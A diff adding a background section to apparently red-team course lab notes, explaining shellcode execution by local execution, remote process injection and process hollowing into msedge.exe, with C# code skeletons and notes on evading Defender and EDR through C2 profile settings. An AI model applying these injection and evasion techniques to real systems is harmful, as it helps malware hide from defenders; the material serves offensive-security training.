@@ -30,6 +30,67 @@ independently — passing one does not mean passing all:
 
 ---
 
+## Background — Malware Development Essentials (Pre-Lab Context)
+
+> **Why this section is here:** The Defence Evasion lab assumes you understand *how* shellcode executes inside a process. The Malware Development Essentials chapter (no standalone lab in the course) teaches the three-step progression that underpins every payload you build here. The Artifact Kit + process-inject settings only make sense once you understand what they're protecting.
+
+### Shellcode Execution — Three-Step Progression
+
+Each step increases stealth by hiding the beacon inside a more legitimate parent process context.
+
+| Step | Technique | Beacon parent | Stealth | OPSEC risk |
+|------|-----------|--------------|---------|------------|
+| 1 | Local execution (own process) | Your injector EXE | Low — injector is a new anomalous process | Injector path visible in process list |
+| 2 | Remote injection (existing PID) | Any running process you chose | Medium — legitimate parent | `OpenProcess` + `CreateRemoteThread` = EDR hook bait |
+| 3 | Process hollowing (suspended spawn) | New legitimate process you spawn | High — signed process, normal parent chain | `CREATE_SUSPENDED` + `WriteProcessMemory` sequence is a known signature — mitigated by Artifact Kit |
+
+### Step 1 — Local Execution
+```csharp
+byte[] buf  = new byte[] { /* shellcode */ };
+IntPtr ptr  = VirtualAlloc(IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+Marshal.Copy(buf, 0, ptr, buf.Length);
+CreateThread(IntPtr.Zero, 0, ptr, IntPtr.Zero, 0, IntPtr.Zero);
+```
+**What Defender sees:** New process → RWX memory allocation → thread start at non-module address → signatured immediately.
+
+**stage block fix:** `set userwx "false"` forces RW→RX transition and removes the RWX page entirely.
+
+### Step 2 — Remote Process Injection
+```csharp
+IntPtr hProc = OpenProcess(0x001F0FFF, false, targetPid);
+IntPtr mem   = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);
+WriteProcessMemory(hProc, mem, buf, (uint)buf.Length, out _);
+CreateRemoteThread(hProc, IntPtr.Zero, 0, mem, IntPtr.Zero, 0, IntPtr.Zero);
+```
+**What Defender sees:** `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` in sequence = classic injection triple. EDR hooks all three.
+
+**process-inject block fix:** `set startrwx "false"` + `set userwx "false"` + custom `execute` methods (`NtQueueApcThread-s`, `SetThreadContext`) swap `CreateRemoteThread` for less-signatured alternatives.
+
+### Step 3 — Process Hollowing (used in Initial Access ngentask.exe technique)
+```csharp
+// Spawn legitimate process in suspended state
+CreateProcessA(null, "msedge.exe", null, null, false, CREATE_SUSPENDED, null, null, ref si, out pi);
+
+// Find image base from PEB
+NtQueryInformationProcess(pi.hProcess, 0 /*ProcessBasicInformation*/, ref pbi, ...);
+ReadProcessMemory(pi.hProcess, pbi.PebBaseAddress + 0x10 /*ImageBaseAddress offset*/, ...);
+
+// Read PE headers to find entry point
+ReadProcessMemory(pi.hProcess, imageBase, dosHeader, ...);
+// e_lfanew → NT headers → AddressOfEntryPoint
+
+// Overwrite entry point with shellcode
+WriteProcessMemory(pi.hProcess, entryPoint, shellcode, shellcode.Length, out _);
+
+// Resume → jumps straight into shellcode, process appears as msedge.exe
+ResumeThread(pi.hThread);
+```
+**What Defender sees:** Legitimate process spawning → process immediately resumes into shellcode bytes not backed by any module = memory anomaly. Mitigated by `stage.module_x64` (module stomping maps a legit DLL over the shellcode region).
+
+> **Connection to this lab:** Every `stage` block setting (`userwx`, `copyheaders`, `module_x64`, `strrep`) directly mitigates one detection vector from the above three steps. The Artifact Kit patches the shellcode loader itself (the XOR decryption loop that executes the beacon). Both must be clean for a beacon to survive.
+
+---
+
 ## Part 1 — Malleable C2 Profile
 
 ### Connect to team server
